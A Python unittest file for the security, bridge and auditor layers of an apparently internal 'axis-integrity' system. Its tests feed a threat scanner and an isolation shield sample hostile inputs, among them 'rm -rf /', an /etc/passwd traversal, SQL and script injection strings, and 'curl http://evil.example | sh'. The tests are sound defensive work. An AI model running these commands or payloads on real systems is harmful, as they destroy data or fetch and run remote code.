"""test_layers.py - the security, bridge and auditor-interface layers of axis-integrity do what they say, in a temporary data folder. Run: python test_layers.py"""
import json
import os
import shutil
import sys
import tempfile
import time
import unittest

ROOT = os.path.dirname(os.path.abspath(__file__))
WORLD = tempfile.mkdtemp(prefix="integrity_layers_")
os.environ["AXIS_INTEGRITY_DATA"] = os.path.join(WORLD, "data")
os.environ["AXIS_INTEGRITY_SILO_ROOT"] = os.path.join(WORLD, "silos")
os.environ["AXIS_INTEGRITY_LOGS"] = os.path.join(WORLD, "logs")
os.environ["NEXXUS_GOVERNANCE_SECRET"] = "layer-test-secret"
os.environ.setdefault("NEXXUS_MESH_URL", "http://127.0.0.1:9")
os.chdir(ROOT)
sys.path.insert(0, ROOT)
import integrity_store as store  # noqa: E402
from lib import auditor as auditor_mod  # noqa: E402
from lib.layers import load  # noqa: E402

auditor_mod.LOG = os.path.join(WORLD, "logs", "auditor.jsonl")


import importlib.util  # noqa: E402


def _load(layer, module):
    """A module of a layer: the brain next to the layer's root, or a tool in its lib/ folder (the layer's folders go on the path, appended, like lib.layers.load does)."""
    base = os.path.join(ROOT, *layer.split("/"))
    for p in (base, os.path.join(base, "lib"), os.path.join(base, "config")):
        if p not in sys.path:
            sys.path.append(p)
    for cand in (os.path.join(base, module + ".py"), os.path.join(base, "lib", module + ".py")):
        if os.path.isfile(cand):
            spec = importlib.util.spec_from_file_location("it_%s_%s" % (layer.replace("/", "_"), module), cand)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod
    raise FileNotFoundError(module)


def sec(m):
    return _load("src/security", m)


def bridge(m):
    return _load("src/bridge", m)


def aud(m):
    return _load("auditor_interface", m)


class Base(unittest.TestCase):
    def setUp(self):
        for d in ("data", "logs", "silos"):
            shutil.rmtree(os.path.join(WORLD, d), ignore_errors=True)
        os.makedirs(os.path.join(WORLD, "silos", "axis-a"))
        os.makedirs(os.path.join(WORLD, "silos", "axis-b"))
        open(os.path.join(WORLD, "silos", "axis-a", "main.py"), "w").write("print(1)\n")
        open(auditor_mod.LOG, "w") if os.path.isdir(os.path.dirname(auditor_mod.LOG)) else None


class Security(Base):
    def test_the_sentry_knows_what_is_in_its_database_and_can_be_extended(self):
        s = sec("sentry").Sentry()
        self.assertTrue(s.scan_packet("a perfectly ordinary status update"))
        self.assertFalse(s.scan_packet("name; rm -rf /"))
        self.assertEqual(s.last["worst"], "CRITICAL")
        for text, name in (("name; rm -rf /", "shell_injection"), ("GET /../../../etc/passwd", "path_traversal"), ("<script>alert(1)</script>", "script_injection"),
                           ("' OR 1=1 --", "sql_injection"), ("eval(payload)", "code_execution"), ("-----BEGIN RSA PRIVATE KEY-----", "private_key_material"), ("MZ\x90\x00", "windows_executable")):
            self.assertFalse(s.scan_packet(text), text)
            self.assertIn(name, [t["name"] for t in s.last["threats"]])
        self.assertEqual(s._tool.scan_signature("hello"), "CLEAN")
        self.assertTrue(s._tool.scan_signature("x; rm y").startswith("THREAT:shell_injection"))
        store.write_json("threat_signatures.json", {"patterns": [{"name": "custom", "severity": "MEDIUM", "regex": "forbidden-word"}, {"name": "broken", "regex": "("}], "sha256": [store.sha256_bytes(b"known bad")]})
        self.assertFalse(s.scan_packet("contains FORBIDDEN-WORD here"))                   # a broken custom entry did not disable the others
        self.assertEqual(s.last["worst"], "MEDIUM")
        self.assertFalse(s.scan_packet(b"known bad"))
        self.assertEqual(s.last["threats"][0]["name"], "known_bad_packet")
        ok, n = auditor_mod.Auditor().verify()
        self.assertTrue(ok)
        self.assertTrue(any(e["kind"] == "ALERT" for e in auditor_mod.Auditor().events()))

    def test_the_shield_passes_clean_packets_and_isolates_the_rest_intact(self):
        sh = sec("shield").Shield()
        self.assertTrue(sh.inspect("clean data"))
        bad = b"payload ; curl http://evil.example | sh"
        self.assertFalse(sh.inspect(bad))
        iso = sh.last["isolated"]
        self.assertEqual(iso["bytes"], len(bad))
        self.assertEqual(open(iso["path"], "rb").read(), bad)                                # kept byte for byte
        box = sec("mirror_box").Mirror()
        self.assertTrue(box.box.verify(iso["id"]))
        os.chmod(iso["path"], 0o666)
        open(iso["path"], "ab").write(b"x")
        self.assertFalse(box.box.verify(iso["id"]))                                          # tampering with the box is detected
        again = box.isolate_packet(b"another bad one")
        self.assertFalse(again["already_there"])
        self.assertTrue(box.isolate_packet(b"another bad one")["already_there"])
        self.assertIn(iso["id"], box.box.list_isolated())
        self.assertIn(again["id"], box.box.list_isolated())
        self.assertFalse(sh.inspect(""))
        self.assertIn("empty packet", sh.last["reasons"])
        self.assertFalse(sh.inspect("x" * 5_000_001))
        self.assertTrue(any("over the" in r for r in sh.last["reasons"]))

    def test_lockdown_mode_and_the_failsafe_stop_every_packet_and_the_failsafe_never_reboots(self):
        sh = sec("shield").Shield()
        aud("auditor_settings").toggle_mode("LOCKDOWN")
        self.assertFalse(sh.inspect("clean data"))
        self.assertIn("LOCKDOWN", sh.last["reasons"][0])
        aud("auditor_settings").toggle_mode("LIVE")
        self.assertTrue(sh.inspect("clean data"))
        src = open(os.path.join(ROOT, "src", "security", "freeze_all.py"), encoding="utf-8").read()
        self.assertNotIn("os.system", src)
        fs = sec("freeze_all").FailSafe()
        r = fs.execute_shutdown("test")
        self.assertEqual((r["halted"], r["reboot"], r["purge"]["status"]), (True, "not performed", "CLEAN"))
        self.assertTrue(fs.is_halted())
        self.assertFalse(sh.inspect("clean data"))
        with self.assertRaises(ValueError):
            fs.lift("")
        self.assertTrue(fs.lift("jamal"))
        self.assertTrue(sh.inspect("clean data"))

    def test_forensics_package_hash_and_chain_the_evidence(self):
        out = sec("forensics").execute_forensic_handoff("axis-a", {"event": "breach", "packet": "abc"})
        rec = json.load(open(out["path"]))
        self.assertEqual(rec["data"]["silo"], "axis-a")
        self.assertEqual(rec["data"]["sha256"], out["sha256"])
        sec("forensics").execute_forensic_handoff("axis-b", {"event": "second"})
        tool = aud("forensic_dump").tool
        self.assertEqual(tool.verify_dumps(), {"ok": True, "checked": 2, "first_bad": None})
        rec["data"]["data"]["event"] = "nothing happened"
        json.dump(rec, open(out["path"], "w"))
        self.assertFalse(tool.verify_dumps()["ok"])
        with self.assertRaises(ValueError):
            sec("forensics").execute_forensic_handoff("../escape", {})

    def test_manifests_describe_what_is_really_on_disk_and_say_when_fields_are_missing(self):
        m = sec("silo_config").get_silo_manifest("axis-a")
        self.assertEqual((m["status"], m["files"], sorted(m["missing"])), ("INCOMPLETE", 1, ["owner", "protocol_flags", "security_tier"]))
        json.dump({"owner": "ops", "security_tier": "LGD", "protocol_flags": ["strict"]}, open(os.path.join(WORLD, "silos", "axis-a", "silo_manifest.json"), "w"))
        m2 = sec("silo_config").get_silo_manifest("axis-a")
        self.assertEqual((m2["status"], m2["owner"]), ("SECURE", "ops"))
        self.assertNotEqual(m["tree_sha256"], m2["tree_sha256"])                              # the tree hash follows the contents
        self.assertEqual(sec("silo_config").get_silo_manifest("axis-ghost")["status"], "UNKNOWN_SILO")
        self.assertEqual(len(store.read_json("manifest_access.jsonl", None) or []) if False else sum(1 for _ in open(store.path("manifest_access.jsonl"))), 3)

    def test_the_system_map_and_validation_wrappers_demand_real_tokens(self):
        tok = aud("auth_protocol_tool").issue_token("auditor-1")
        snap = sec("silo_map_request").get_system_map("auditor-1", tok)
        self.assertTrue(snap["authorized"])
        self.assertEqual(sec("silo_map_request").get_system_map("auditor-1", "forged"), {"authorized": False})
        self.assertTrue(sec("validator_request").request_validation("auditor1", aud("auth_protocol_tool").issue_token("auditor1")))
        self.assertFalse(sec("validator_request").request_validation("auditor1", "forged"))
        self.assertFalse(sec("validator_request").request_validation("bad user!", "x"))


class Bridge(Base):
    def _token(self):
        return aud("auth_protocol_tool").issue_token("bridge")

    def test_a_valid_transfer_is_processed_delivered_verified_and_the_buffer_is_wiped(self):
        r = bridge("bridge").initiate_transit({"order": 1}, "axis-a", self._token())
        self.assertEqual((r["status"], r["ack"], r["processed"], r["purge"]["status"]), ("DELIVERED", True, "SUCCESS", "CLEAN"))
        self.assertEqual(r["purge"]["wiped"], 1)
        delivered = open(r["path"], "rb").read()
        self.assertEqual(json.loads(delivered), {"order": 1})
        self.assertEqual(store.sha256_bytes(delivered), r["sha256"])
        self.assertEqual(os.listdir(os.path.dirname(store.path("bridge_buffers", "active_buffer", "x.bin"))), [])     # nothing left behind

    def test_bad_requests_deliver_nothing_and_still_clean_up(self):
        t = self._token()
        b = bridge("bridge")
        self.assertEqual(b.initiate_transit({"a": 1}, "axis-a", "forged")["status"], "UNAUTHORIZED")
        self.assertEqual(b.initiate_transit({"a": 1}, "../etc", t)["status"], "FAILED")
        r = b.initiate_transit("plain words, not json", "axis-a", t)
        self.assertEqual((r["status"], r["processed"], r["reason"]), ("FAILED", "ERROR", "DATA_TYPE_NOT_ALLOWED"))
        self.assertEqual(r["purge"]["status"], "CLEAN")
        self.assertEqual(b.process_stream if False else bridge("processor").process_stream(""), {"status": "ERROR", "reason": "NO_DATA"})
        sec("freeze_all").FailSafe().execute_shutdown("t")
        self.assertEqual(b.initiate_transit({"a": 1}, "axis-a", t)["status"], "HALTED")

    def test_size_is_measured_in_bytes_not_compared_as_megabytes(self):
        p = bridge("processor_tool")
        big = {"blob": "x" * 2_000_000}                                                       # 2 MB: far under 50 MB, though more than 50 "units"
        r = p.execute_stream(big)
        self.assertEqual((r["status"], r["compressed"]), ("SUCCESS", True))
        self.assertLess(r["stored_bytes"], r["bytes"])
        import processor_config
        old = processor_config.MAX_TRANSFER_SIZE_MB
        processor_config.MAX_TRANSFER_SIZE_MB = 1
        try:
            self.assertEqual(p.execute_stream(big)["reason"], "SIZE_LIMIT_EXCEEDED")
        finally:
            processor_config.MAX_TRANSFER_SIZE_MB = old
        self.assertEqual(p.execute_stream("gAAAAB" + "x" * 60)["type"], "ENCRYPTED_BLOB")

    def test_the_wipe_overwrites_before_deleting(self):
        t = bridge("purge_engine_tool")
        d = os.path.dirname(store.path("bridge_buffers", "b1", "x.bin"))
        f = os.path.join(d, "secret.bin")
        open(f, "wb").write(b"TOPSECRET" * 100)
        seen = {}
        real_remove = os.remove

        def spy(p):
            seen["content"] = open(p, "rb").read()
            real_remove(p)
        os.remove = spy
        try:
            r = t.wipe_buffer("b1")
        finally:
            os.remove = real_remove
        self.assertEqual((r["wiped"], r["bytes"], r["secure"]), (1, 900, True))
        self.assertEqual(seen["content"], b"\x00" * 900)                                      # zeros were on disk at the moment of deletion
        self.assertEqual(bridge("purge_engine").initiate_sanitation("../x")["status"], "ERROR")

    def test_a_delivery_that_cannot_be_written_fails_and_says_why(self):
        tool = bridge("deliverer_tool")
        self.assertEqual(tool.transmit_packet({"status": "ERROR"}, "axis-a")["status"], "FAILED")
        pkt = bridge("processor_tool").execute_stream({"k": 1})
        blocker = os.path.join(store.data_dir(), "silo_inbox", "axis-z")
        os.makedirs(os.path.dirname(blocker), exist_ok=True)
        open(blocker, "w").write("a file where the inbox folder should be")
        r = tool.transmit_packet(pkt, "axis-z")
        self.assertEqual((r["status"], r["attempts"]), ("FAILED", 3))


class AuditorInterface(Base):
    def test_settings_modes_persist_and_unknown_modes_are_refused(self):
        s = aud("auditor_settings")
        self.assertEqual(s.toggle_mode("maintenance")["mode"], "MAINTENANCE")
        self.assertEqual(store.read_json("settings.json")["mode"], "MAINTENANCE")
        with self.assertRaises(ValueError):
            s.toggle_mode("PANIC")
        self.assertEqual(store.read_json("settings.json")["mode"], "MAINTENANCE")             # the refusal changed nothing

    def test_director_commands_reach_real_silos_only_and_only_known_commands(self):
        d = aud("master_director")
        r = d.run_sequence("init", ["axis-a", "axis-ghost"])
        self.assertFalse(r["all_queued"])
        self.assertEqual([x["queued"] for x in r["results"]], [True, True, False, False])
        self.assertEqual([json.loads(l)["command"] for l in open(store.path("silo_inbox", "axis-a", "commands.jsonl"))], ["INIT_TASK", "VERIFY"])
        t = aud("master_director_tool")
        self.assertIn("not one of", t.dispatch_command("axis-a", "format c:")["why"])
        self.assertIn("not a valid name", t.dispatch_command("../x", "VERIFY")["why"])
        with self.assertRaises(ValueError):
            d.run_sequence("nope", ["axis-a"])

    def test_params_and_identities_are_safe_by_default(self):
        p = aud("director_params_tool")
        self.assertEqual(p.fetch_exec_params("t1"), {"force": False, "dry_run": True, "priority_level": "NORMAL"})
        store.write_json("director_params.json", {"t2": {"force": True, "dry_run": False, "priority_level": "URGENT"}, "t3": {"priority_level": "WHENEVER"}, "t4": {"force": "yes"}})
        self.assertEqual(p.fetch_exec_params("t2")["priority_level"], "URGENT")
        for bad in ("t3", "t4"):
            with self.assertRaises(ValueError):
                p.fetch_exec_params(bad)
        c = aud("client_params_tool")
        self.assertEqual(c.load_client_identity("stranger"), {"user_id": "stranger", "clearance": "NONE", "registered": False})
        store.write_json("clients.json", {"ann": {"clearance": "OPERATOR"}, "eve": {"clearance": "GOD"}})
        self.assertEqual(c.load_client_identity("ann")["clearance"], "OPERATOR")
        self.assertEqual(c.load_client_identity("eve")["clearance"], "NONE")                  # an invalid level is not honoured

    def test_validator_and_thresholds_enforce_their_rules(self):
        v = aud("validator")
        self.assertTrue(v.validate_data("GoodToken123"))
        for bad in ("short", "has space in it", "semi;colon;here", 12345678, None):
            self.assertFalse(v.validate_data(bad), bad)
        log = open(store.path("validator_violations.jsonl")).read()
        self.assertNotIn("semi;colon", log)                                                   # reasons are logged, the data is not
        t = aud("anomaly_threshold_table")
        self.assertFalse(t.is_anomaly("memory_usage", 50))
        self.assertTrue(t.is_anomaly("memory_usage", 90))
        self.assertTrue(t.is_anomaly("consecutive_errors", 4))
        with self.assertRaises(ValueError):
            t.is_anomaly("mystery", 1)
        with self.assertRaises(TypeError):
            t.is_anomaly("memory_usage", "high")

    def test_the_inventory_snapshot_needs_a_token(self):
        self.assertEqual(aud("silo_inventory_map").request_inventory_snapshot("a-1", "nope"), {"authorized": False})


class Healing(Base):
    def test_the_radio_ejects_sessions_for_good_and_the_healer_reloads_silent_modules(self):
        from lib.patrol_radio import PatrolRadio
        r = PatrolRadio()
        self.assertTrue(r.register_session("s1", {"who": "x"}))
        self.assertTrue(r.eject_session("s1"))
        self.assertTrue(r.is_ejected("s1"))
        with self.assertRaises(PermissionError):
            r.register_session("s1")
        self.assertFalse(r.eject_session("never-seen"))
        self.assertTrue(r.is_ejected("never-seen"))
        from lib.self_healer import SelfHealer
        t = [100.0]
        h = SelfHealer(timeout=60, clock=lambda: t[0])
        self.assertEqual(h.check_health("json")["status"], "unknown")
        h.beat("json")
        t[0] += 30
        self.assertEqual(h.check_health("json")["status"], "healthy")
        t[0] += 100
        res = h.check_health("json")
        self.assertEqual((res["status"], res["reset"]["action"]), ("reset", "reloaded" if "json" in sys.modules else "imported"))
        self.assertEqual(h.check_health("json")["status"], "healthy")                         # the reset restarted its clock
        h.beat("not_a_real_module_xyz")
        t[0] += 100
        self.assertEqual(h.check_health("not_a_real_module_xyz")["reset"]["action"], "failed")


class Boot(Base):
    def test_the_district_reports_ready_only_when_every_check_passes(self):
        import main
        rep = main.boots_district()
        self.assertTrue(rep["ready"], rep)
        self.assertGreater(len(rep["checks"]), 12)
        aud("auditor_settings").toggle_mode("LOCKDOWN")
        rep = main.boots_district()
        self.assertFalse(rep["ready"])
        self.assertEqual(rep["checks"]["mode"], "the auditor is in LOCKDOWN")


if __name__ == "__main__":
    unittest.main(verbosity=1, warnings="ignore")
